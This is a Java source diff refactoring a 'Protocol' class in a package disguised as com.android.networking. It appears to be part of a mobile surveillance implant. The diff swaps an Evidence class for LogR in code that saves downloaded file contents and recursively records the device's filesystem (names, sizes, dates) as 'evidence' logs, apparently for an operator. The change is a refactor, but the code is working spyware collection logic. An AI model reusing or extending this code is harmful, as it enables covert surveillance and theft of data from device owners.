@@ -17,13 +17,13 @@ import java.util.Vector;
 import android.content.Intent;
 import android.net.Uri;
 
-import com.android.networking.LogR;
 import com.android.networking.Messages;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfType;
-import com.android.networking.evidence.Evidence;
+
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
@@ -93,7 +93,7 @@ public abstract class Protocol implements iProtocol {
 		}
 
 		if (success) {
-			Evidence.info(Messages.getString("5.1")); //$NON-NLS-1$
+			LogR.info(Messages.getString("5.1")); //$NON-NLS-1$
 			return true;
 		} else {
 			return false;
@@ -244,7 +244,7 @@ public abstract class Protocol implements iProtocol {
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
 		// final Evidence log = new Evidence(0);
 
-		new LogR(EvidenceType.DOWNLOAD, LogR.LOG_PRI_STD, additional, content);
+		LogR.atomic(EvidenceType.DOWNLOAD, additional, content);
 
 		// log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);
 
@@ -303,13 +303,8 @@ public abstract class Protocol implements iProtocol {
 	 *            the path
 	 */
 	public static void saveFilesystem(final int depth, String path) {
-		final Evidence fsLog = new Evidence(EvidenceType.FILESYSTEM);
-		if (!fsLog.createEvidence(null, EvidenceType.FILESYSTEM)) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveFilesystem) Error: cannot create evidence");//$NON-NLS-1$
-			}
-			return;
-		}
+		LogR fsLog = new LogR(EvidenceType.FILESYSTEM);
+		
 
 		// Expand path and create log
 		if (path.equals("/")) { //$NON-NLS-1$
@@ -344,7 +339,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param depth
 	 *            the depth
 	 */
-	private static void expandRoot(final Evidence fsLog, final int depth) {
+	private static void expandRoot(final LogR fsLog, final int depth) {
 		if (Cfg.DEBUG) {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
@@ -362,7 +357,7 @@ public abstract class Protocol implements iProtocol {
 	 *            the filepath
 	 * @return true, if successful
 	 */
-	private static boolean saveFilesystemLog(final Evidence fsLog, final String filepath) {
+	private static boolean saveFilesystemLog(final LogR fsLog, final String filepath) {
 		if (Cfg.DEBUG) {
 			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
 		}
@@ -410,7 +405,7 @@ public abstract class Protocol implements iProtocol {
 		databuffer.writeLong(DateTime.getFiledate(file.getFileTime()));
 		databuffer.write(w_filepath);
 
-		fsLog.writeEvidence(content);
+		fsLog.write(content);
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " expandPath: written log");//$NON-NLS-1$
 		}
@@ -425,7 +420,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param fsLog
 	 *            the fs log
 	 */
-	private static void saveRootLog(final Evidence fsLog) {
+	private static void saveRootLog(final LogR fsLog) {
 		final int version = 2010031501;
 		if (Cfg.DEBUG) {
 			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
@@ -439,7 +434,7 @@ public abstract class Protocol implements iProtocol {
 		databuffer.writeLong(0);
 		databuffer.writeLong(DateTime.getFiledate(new Date()));
 		databuffer.write(WChar.getBytes("/")); //$NON-NLS-1$
-		fsLog.writeEvidence(content);
+		fsLog.write(content);
 	}
 
 	/**
@@ -453,7 +448,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param depth
 	 *            the depth
 	 */
-	private static void expandPath(final Evidence fsLog, final String path, final int depth) {
+	private static void expandPath(final LogR fsLog, final String path, final int depth) {
 		if (Cfg.DEBUG) {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
@@ -493,7 +488,6 @@ public abstract class Protocol implements iProtocol {
 				}
 			}
 		}
-
 	}
 
 	/**
